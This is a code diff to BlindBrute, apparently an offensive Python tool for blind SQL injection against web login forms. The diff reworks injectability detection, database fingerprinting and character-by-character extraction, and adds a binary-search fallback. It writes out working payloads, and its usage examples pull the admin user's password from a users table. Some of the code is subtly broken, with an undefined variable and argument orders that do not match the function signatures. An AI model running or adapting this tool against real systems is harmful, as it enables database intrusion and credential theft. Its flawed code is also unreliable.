@@ -46,16 +46,12 @@ def usage():
         blindbrute.py -u "http://example.com/login" -ih Cookie "SESSION=abc123" -t users -c password -w "username='admin'"
         blindbrute.py -u "http://example.com/login" -f request.txt -t users -c password -w "username='admin'" --binary-attack
         blindbrute.py -u "http://example.com/login" -t users -c password -w "username='admin'" --force status
-
-    Description:
-        BlindBrute is a tool for performing blind SQL injection attacks. It supports detecting vulnerabilities using status codes, content length, 
-        keyword comparisons, and time-based SQL injection techniques. Custom headers, data, and HTTP request templates can be used for precise control.
     """
     print(usage)
 
 CHARSET = string.ascii_letters + string.digits + string.punctuation + " "
 
-def load_version_queries():
+def version_queries():
     file_path = os.path.join(os.path.dirname(__file__), 'version_queries.json')
     try:
         with open(file_path, 'r') as file:
@@ -65,7 +61,7 @@ def load_version_queries():
         print(f"Error loading version queries: {e}")
         return {}
 
-version_queries = load_version_queries()
+version_queries = version_queries()
 
 def max_workers(args):
 
@@ -85,9 +81,14 @@ max_workers = max_workers()
 
 def is_injectable(request_template=None, injectable_headers={}, static_headers={}, args=None):
     
-    test_payloads = {
-        "true_condition": "' AND '1'='1",
-        "false_condition": "' AND '1'='2"
+    if args.sleep_only:
+        return True, "sleep"
+
+    print("[*] Checking if the field is injectable...")
+
+    payloads = {
+        "true": "' AND '1'='1",
+        "false": "' AND '1'='2"
     }
 
     true_response_content = ""
@@ -96,12 +97,8 @@ def is_injectable(request_template=None, injectable_headers={}, static_headers={
     false_status_code = None
 
     # Step 1: Test true and false conditions
-    for condition, payload in test_payloads.items():
+    for condition, payload in payloads.items():
         encoded_payload = quote(payload)
-
-        if args.verbose:
-            print(f"[VERBOSE] Testing condition: {condition}")
-            print(f"[VERBOSE] Payload: {payload} | Encoded Payload: {encoded_payload}")
         
         try:
             response, response_time = inject( 
@@ -114,64 +111,48 @@ def is_injectable(request_template=None, injectable_headers={}, static_headers={
             
             if not response:
                 return None, None
-            
-            if args.delay > 0:
-                if args.verbose:
-                    print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
-                time.sleep(args.delay)
 
-            if condition == "true_condition":
+            if condition == "true":
                 true_status_code = response.status_code
                 true_response_content = response.text
-            elif condition == "false_condition":
+            elif condition == "false":
                 false_status_code = response.status_code
                 false_response_content = response.text
 
-            if args.verbose:
-                print(f"[VERBOSE] Sent request with payload: {encoded_payload}")
-                print(f"[VERBOSE] Response status: {response.status_code}, length: {len(response.text)}")
-                print(f"[VERBOSE] Request time: {response_time} seconds")
-
         except requests.exceptions.RequestException as e:
-            print(f"[-] Error during {condition} injection request: {e}")
+            print(f"[-] Error during {condition} condition injection request: {e}")
             return None, None
+            
+    true_content_length = len(true_response_content)
+    false_content_length = len(false_response_content)
 
     # Step 2: Dertermine detection method
     if args.true_keywords or args.false_keywords:
         if args.true_keywords:
             if any(keyword in true_response_content for keyword in args.true_keywords):
-                print("[+] Keyword(s) detected in true condition response. header is likely injectable!")
+                print("[+] Keyword(s) detected in true condition response. Field is likely injectable!")
                 return True, "keyword"
             else:
-                print("[-] No true keywords found in response.")
+                print("[-] No keywords found in response.")
                 return None, None
-
         if args.false_keywords:
             if any(keyword in false_response_content for keyword in args.false_keywords):
-                print("[+] Keyword(s) detected in false condition response.")
+                print("[+] Keyword(s) detected in false condition response. Field is likely injectable!")
                 return True, "keyword"
             else:
-                print("[-] No false keywords found in response.")
+                print("[-] No keywords found in response.")
                 return None, None
-
-        return False, None
-        print (f"[-] Keyword detection failed.")
-
-    if true_status_code != false_status_code:
-        print(f"[+] Status code difference detected (true: {true_status_code}, false: {false_status_code}). header is likely injectable!")
+    elif true_status_code != false_status_code:
+        print(f"[+] Status code difference detected (true: {true_status_code}, false: {false_status_code}). Field is likely injectable!")
         return True, "status"
-
-    true_content_length = len(true_response_content)
-    false_content_length = len(false_response_content)
-    
-    if true_content_length != false_content_length:
-        print(f"[+] Content length difference detected (true: {true_content_length}, false: {false_content_length}). header is likely injectable!")
+    elif true_content_length != false_content_length:
+        print(f"[+] Content length difference detected (true: {true_content_length}, false: {false_content_length}). Field is likely injectable!")
         if args.verbose:
             print(f"[VERBOSE] True response length: {true_content_length} | False response length: {false_content_length}")
         return True, "content"
-
-    print("[-] No significant status code, content length, or keyword differences detected. header is likely not injectable.")
-    return False, None
+    else:
+        print("[-] No significant status code, content length, or keyword differences detected. Field is likely not injectable.")
+        return False, None
 
 def detect_database(detection, request_template=None, injectable_headers={}, static_headers={},  args=None):
     
@@ -208,21 +189,17 @@ def detect_database(detection, request_template=None, injectable_headers={}, sta
             result = future.result()
             if result:
                 db_name, substring_query, sleep_query, length_function = result
-                print(f"[+] Database detected: {detected_db}")
+                print(f"[+] Database detected: {db_name}")
                 return db_name, substring_query, sleep_query, length_function
 
     print(f"[-] Unable to detect the database type. Exiting")
     return None, None
 
-def discover_length(table, column, where_clause, db_name, sleep_query, substring_query, length_function, detection, request_template=None, injectable_headers={}, static_headers={}, args=None):
+def discover_length(table, column, where_clause, db_name, substring_query, sleep_query, length_function, detection, request_template=None, injectable_headers={}, static_headers={}, args=None):
 
     if not length_function:
-        print(f"[-] Length function not found for {db_name}.")
-        return None
-    
-    if args.sleep_only and not sleep_query:
-        print(f"[-] Sleep function not found for {db_name}.")
-        return None
+        print(f"[-] Length query not found for {db_name}.")
+        return db_name, substring_query, sleep_query, None
 
     # Step 1: Baseline request
     try:
@@ -300,21 +277,17 @@ def discover_length(table, column, where_clause, db_name, sleep_query, substring
 
     if length:
         print(f"[+] Data length discovered: {length}")
-        return length, sleep_query, substring_query, db_name
+        return db_name, substring_query, sleep_query, length 
     else:
         print(f"[-] Failed to discover data length within the maximum length {args.max_length}.")
-        return None, sleep_query, substring_query, db_name
+        return db_name, substring_query, sleep_query, None
 
-def extract_data(table, column, where_clause, db_name, sleep_query, substring_query, length, position, extraction, request_template=None, injectable_headers={}, static_headers={}, args=None):
+def extract_data(table, column, where_clause, db_name, substring_query, sleep_query, length, position, extraction, request_template=None, injectable_headers={}, static_headers={}, args=None):
+
+    print("[*] Attempting to extract data...")
 
     extracted_data = ""
     wordlist = None
-
-    if args.verbose:
-        print(f"[VERBOSE] Starting data extraction for {table}.{column}...")
-        print(f"[VERBOSE] WHERE clause: {where_clause}")
-        if not args.sleep_only:
-            print(f"[VERBOSE] Extraction method: {extraction}")
 
     if args.dictionary_attack:
         try:
@@ -346,7 +319,7 @@ def extract_data(table, column, where_clause, db_name, sleep_query, substring_qu
                 encoded_payload = quote(payload)
 
                 result = extract(
-                    table, column, where_clause, db_name, sleep_query, substring_query, position, 
+                    table, column, where_clause, db_name, substring_query, sleep_query, position, 
                     request_template, injectable_headers, static_headers,
                     extraction, baseline_status_code, baseline_content_length,
                     encoded_payload=encoded_payload, value=chr(mid), args=args
@@ -361,10 +334,6 @@ def extract_data(table, column, where_clause, db_name, sleep_query, substring_qu
                 extracted_data += chr(low)
                 print(f"Value found: {chr(low)} at position {position}")
                 found_match = True
-            else:
-                print(f"[*] No valid match found at position {position}. Moving to next position.")
-
-            position += 1
 
             if not found_match:
                 print(f"[*] No match found at position {position}. Stopping extraction.")
@@ -388,7 +357,7 @@ def extract_data(table, column, where_clause, db_name, sleep_query, substring_qu
                 payload = f"' AND {substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {len(value)}) = '{value}"
                 encoded_payload = quote(payload)
 
-                tasks.append(executor.submit(extract, table, column, where_clause, db_name, sleep_query, substring_query, position, value,
+                tasks.append(executor.submit(extract, table, column, where_clause, db_name, substring_query, sleep_query, position, value,
                                              request_template, injectable_headers, static_headers, extraction,
                                              baseline_status_code, baseline_content_length, encoded_payload, args))
 
@@ -402,29 +371,45 @@ def extract_data(table, column, where_clause, db_name, sleep_query, substring_qu
                     break
 
         if not found_match:
-            print(f"[*] No match found at position {position}. Stopping extraction.")
-            break
+            if wordlist:
+                if spent():
+                    print(f"[*] Extracting single character at position {position} using binary search.")
+                    low, high = 32, 126
+                    found_match = False
+                    while low <= high:
+                        mid = (low + high) // 2
+                        payload = f"' AND ASCII({substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, 1)) > {mid}"
+                        encoded_payload = quote(payload)
+
+                        result = extract(
+                            table, column, where_clause, db_name, substring_query, sleep_query, position, 
+                            request_template, injectable_headers, static_headers,
+                            extraction, baseline_status_code, baseline_content_length,
+                            encoded_payload=encoded_payload, value=chr(mid), args=args
+                            )
+
+                        if result:
+                            low = mid + 1
+                        else:
+                            high = mid - 1
+
+                    if 32 <= low <= 126:
+                        extracted_data += chr(low)
+                        print(f"Value found: {chr(low)} at position {position}")
+                        found_match = True
+                        position += 1
+                        continue
+                    else:
+                        print(f"[*] No valid match found at position {position}. Stopping extraction.")
+                        break
+
+            else:
+                print(f"[*] No match found at position {position}. Stopping extraction.")
+                break
 
     return extracted_data
 
-### Helper Functions <3
-
-def one_third():
-
-    print("\n[*] A third or less of the data remains to be extracted.")
-    print("[*] Would you like to fallback to character-by-character extraction? (y/n): ", end='', flush=True)
-    
-    i, _, _ = select.select([sys.stdin], [], [], 60)
-    
-    if i:
-        user_input = sys.stdin.readline().strip().lower()
-        if user_input == 'y':
-            return True
-        elif user_input == 'n':
-            return False
-    else:
-        print("\n[*] No input received. Fallback to character extraction will proceed automatically.")
-        return True
+### Prompts
 
 def no_length():
 
@@ -441,6 +426,40 @@ def no_length():
     else:
         print("\n[*] No input received. Proceeding with extraction anyway.")
         return True
+
+def one_third():
+
+    print("\n[*] A third or less of the data remains to be extracted. It is unlikely that the reamining data will be contained in the wordlist.")
+    print("[*] Would you like to fallback to character-by-character extraction? (y/n): ", end='', flush=True)
+    
+    i, _, _ = select.select([sys.stdin], [], [], 60)
+    
+    if i:
+        user_input = sys.stdin.readline().strip().lower()
+        if user_input == 'y':
+            return True
+        elif user_input == 'n':
+            return False
+    else:
+        print("\n[*] No input received. Fallback to character extraction will proceed automatically.")
+        return True
+
+def spent():
+    print("\n[*] Wordlist exhausted. Would you like to extract a single character at the current position and retry the wordlist? (y/n): ", end='', flush=True)
+
+    i, _, _ = select.select([sys.stdin], [], [], 60)
+    
+    if i:
+        user_input = sys.stdin.readline().strip().lower()
+        if user_input == 'y':
+            return True
+        elif user_input == 'n':
+            return False
+    else:
+        print("\n[*] No input received. Proceeding with character extraction automatically.")
+        return True
+
+### Helper Functions <3
 
 def load_request(file_path):
 
@@ -563,6 +582,11 @@ def inject(encoded_payload, request_template, injectable_headers, static_headers
             print(f"[VERBOSE] Response status: {response.status_code}, length: {len(response.text)}")
             print(f"[VERBOSE] Request time: {response_time} seconds")
 
+            if args.delay > 0:
+                if args.verbose:
+                    print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                time.sleep(args.delay)
+
         return response, response_time
         
     except requests.exceptions.RequestException as e:
@@ -589,9 +613,6 @@ def detect(encoded_payload, db_name, sleep_function, detection, request_template
             payload = f"' AND {sleep_query}"
             encoded_payload = quote(payload)
 
-    if args.verbose:
-        print(f"[VERBOSE] Querying for {db_name} with payload: {encoded_payload}")
-
     try:
         response, response_time = inject(
             encoded_payload=encoded_payload,
@@ -604,29 +625,19 @@ def detect(encoded_payload, db_name, sleep_function, detection, request_template
         if not response:
             return None
 
-        if args.delay > 0:
-            if args.verbose:
-                print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
-            time.sleep(args.delay)
-
         if args.sleep_only and response_time > 5:
-            print(f"[+] Sleep-based detection: Database detected as {db_name}")
             return db_name, substring_query, sleep_query, length_function
         else:
             if detection == "status" and response.status_code != baseline_status_code:
-                print(f"[+] Status-based detection: Database detected as {db_name}")
                 return db_name, substring_query, None, length_function
             elif detection == "content" and len(response.text) != baseline_content_length:
-                print(f"[+] Content-based detection: Database detected as {db_name}")
                 return db_name, substring_query, None, length_function
             elif detection == "keyword":
                 if args.true_keywords:
                     if any(keyword in response.text for keyword in args.true_keywords):
-                        print(f"[+] Keyword-based detection: Database detected as {db_name}")
                         return db_name, substring_query, None, length_function
                 elif args.false_keywords:
                     if any(keyword in response.text for keyword in args.false_keywords):
-                        print(f"[+] Keyword-based detection: Database is not {db_name}")
                         return None
 
 
@@ -635,15 +646,12 @@ def detect(encoded_payload, db_name, sleep_function, detection, request_template
     
     return None
 
-def extract(encoded_payload, table, column, where_clause, db_name, sleep_query, substring_query, position, value, extraction, request_template, injectable_headers, static_headers, baseline_status_code, baseline_content_length, args=None):
+def extract(encoded_payload, table, column, where_clause, db_name, substring_query, sleep_query, position, value, extraction, request_template, injectable_headers, static_headers, baseline_status_code, baseline_content_length, args=None):
 
     # Sleep only override for encoded payload
     if args.sleep_only and sleep_query:
             payload = f"' AND {sleep_query} AND {substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {value_length}) = '{value}'"
             encoded_payload = quote(payload)
-    
-    if args.verbose:
-            print(f"[VERBOSE] Querying for {db_name} with payload: {encoded_payload}")
     
     try:
         response, response_time = inject(
@@ -657,13 +665,7 @@ def extract(encoded_payload, table, column, where_clause, db_name, sleep_query, 
         if not response:
             return None
 
-        if args.delay > 0:
-            if args.verbose:
-                print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
-            time.sleep(args.delay)
-
         if args.sleep_only and response_time > 5:
-            print(f"[+] Sleep-based match found: {value} at position {position}")
             return value
         else:
             if extraction == "keyword":
@@ -762,14 +764,13 @@ def main():
         injectable, detection = is_injectable(injectable_headers, static_headers, request_template, args=args)
         if not injectable:
             return
-        print(f"[+] header is injectable using {detection} method.")
-        print("[+] Checking database type and corresponding substring function...")
-
+        if not args.sleep_only:
+            print(f"[+] Using {detection} detection method.")
+        
     # Step 2: Detect the database type
-    db_name, sleep_query, substring_query, length_function = detect_database(request_template, injectable_headers, static_headers, detection=detection, args=args)
+    db_name, substring_query, sleep_query, length_function = detect_database(request_template, injectable_headers, static_headers, detection=detection, args=args)
 
     if not db_name:
-        print("[-] Unable to detect database type.")
         return
     elif not substring_query:
         print(f"[*] Database {db_name} detected, but substring operations are not applicable.")
@@ -781,8 +782,8 @@ def main():
         column=args.column,
         where_clause=args.where,
         db_name=db_name,
-        sleep_query=sleep_query,
         substring_query=substring_query,
+        sleep_query=sleep_query,
         length_function=length_function,
         detection=detection,
         request_template=request_template,
@@ -791,12 +792,10 @@ def main():
         args=args
     )
 
-    if length:
-        print(f"[+] Data length to extract: {length}")
-    else:
+    if not length:
         if no_length():
             length = args.max_length
-            print(f"[!] Data length not discovered. Defaulting to max length: {length} (can be adjusted with --max-length)")
+            print(f"[!] Data length not discovered. Defaulting to max length: {length} (adjust with --max-length)")
         else:
             print("[-] User chose not to proceed with extraction.")
             return
@@ -807,8 +806,8 @@ def main():
         column=args.column,
         where_clause=args.where,
         db_name=db_name, 
+        substring_query=substring_query,
         sleep_query=sleep_query, 
-        substring_query=substring_query, 
         length=length,
         position=1,
         extraction=detection,
